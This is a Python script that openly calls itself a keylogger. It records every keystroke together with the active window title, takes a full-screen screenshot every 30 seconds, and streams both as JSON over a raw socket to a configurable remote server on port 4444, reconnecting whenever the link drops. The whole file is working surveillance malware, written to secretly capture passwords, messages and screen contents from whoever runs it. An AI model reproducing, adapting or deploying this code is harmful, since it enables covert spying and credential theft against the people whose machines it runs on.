import os
import getpass
import pyperclip
import psutil
import platform
import socket
import requests
import time
import threading
import json
import base64
from datetime import datetime
from pynput import keyboard
from mss import mss

# Windows specific imports
import win32gui
import win32process

# --- Configuration ---
SERVER_HOST = '127.0.0.1'  # Change this to the server's IP address
SERVER_PORT = 4444

# --- Connection ---
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def connect_to_server():
    while True:
        try:
            client_socket.connect((SERVER_HOST, SERVER_PORT))
            print("[+] Connected to server.")
            break
        except ConnectionRefusedError:
            print("[-] Server not found. Retrying in 5 seconds...")
            time.sleep(5)

connect_to_server() # Initial connection attempt

def send_data(data):
    try:
        client_socket.sendall(json.dumps(data).encode('utf-8') + b'\n')
    except (ConnectionResetError, BrokenPipeError):
        print("[-] Connection to server lost. Reconnecting...")
        connect_to_server()

# --- Data Collection ---

def get_active_window_info():
    try:
        hwnd = win32gui.GetForegroundWindow()
        pid = win32process.GetWindowThreadProcessId(hwnd)[1]
        window_title = win32gui.GetWindowText(hwnd)
        return window_title, str(pid)
    except Exception:
        return "UNKNOWN", "-1"

def log_keystroke(key):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    window_title, _ = get_active_window_info()
    key_str = format_key(key)

    data = {
        'type': 'keystroke',
        'timestamp': timestamp,
        'key': key_str,
        'window_title': window_title,
    }
    send_data(data)

def capture_screenshot():
    while True:
        try:
            with mss() as sct:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                sct_img = sct.grab(sct.monitors[1])
                img_bytes = mss.tools.to_png(sct_img.rgb, sct_img.size)
                img_base64 = base64.b64encode(img_bytes).decode('utf-8')

                data = {
                    'type': 'screenshot',
                    'timestamp': timestamp,
                    'image': img_base64,
                }
                send_data(data)
        except Exception as e:
            print(f"[!] Error capturing screenshot: {e}")
        
        time.sleep(30) # Capture every 30 seconds

def format_key(key):
    if hasattr(key, 'char') and key.char:
        return key.char
    else:
        return str(key)

# --- Main ---
if __name__ == "__main__":
    # Start screenshot capture in a background thread
    screenshot_thread = threading.Thread(target=capture_screenshot, daemon=True)
    screenshot_thread.start()

    print(f"[+] Keylogger started at {datetime.now()}...")
    
    with keyboard.Listener(on_press=log_keystroke) as listener:
        listener.join()